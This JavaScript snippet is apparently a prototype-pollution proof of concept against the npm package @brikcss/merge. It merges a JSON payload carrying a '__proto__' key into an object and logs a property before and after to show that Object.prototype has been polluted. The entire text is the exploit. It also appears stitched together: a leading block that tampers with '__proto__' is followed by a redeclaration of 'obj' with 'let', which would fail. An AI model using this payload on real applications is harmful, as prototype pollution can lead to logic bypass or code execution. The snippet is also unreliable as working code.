var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const merge = require('@brikcss/merge');
let obj = {};
let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
merge(obj, JSON.parse(malicious_payload));
console.log({}.polluted);